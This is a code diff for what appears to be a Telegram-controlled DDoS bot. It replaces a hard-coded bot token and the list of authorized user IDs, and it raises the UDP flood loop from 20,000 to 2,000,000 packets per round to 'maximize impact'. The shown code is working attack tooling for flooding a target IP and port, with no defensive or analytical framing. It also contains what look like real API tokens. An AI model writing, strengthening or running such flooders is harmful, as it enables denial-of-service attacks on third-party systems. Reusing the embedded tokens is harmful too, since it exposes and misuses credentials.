@@ -38,11 +38,11 @@ def install_requirements():
 install_requirements()
 
 # 🎛️ Telegram API token (replace with your actual token)
-TOKEN = '7788865701:AAEHVM8BGHCY_fIECUSn_ydJ_45Jn0p72-M'
+TOKEN = '8022705558:AAFIkcDxK0w2HtkXfPKlraQRTqK4L63Mg-o'
 bot = telebot.TeleBot(TOKEN, threaded=False)
 
 # 🛡️ List of authorized user IDs (replace with actual IDs)
-AUTHORIZED_USERS = [809680839, 6740684755 , 7163028849]
+AUTHORIZED_USERS = [7163028849, 6740684755]
 
 # 🌐 Global dictionary to keep track of user attacks
 user_attacks = {}
@@ -61,7 +61,7 @@ def udp_flood(target_ip, target_port, stop_flag):
         try:
             packet_size = random.randint(64, 1469)  # Random packet size
             data = os.urandom(packet_size)  # Generate random data
-            for _ in range(20000):  # Maximize impact by sending multiple packets
+            for _ in range(2000000):  # Maximize impact by sending multiple packets
                 sock.sendto(data, (target_ip, target_port))
         except Exception as e:
             logging.error(f"Error sending packets: {e}")
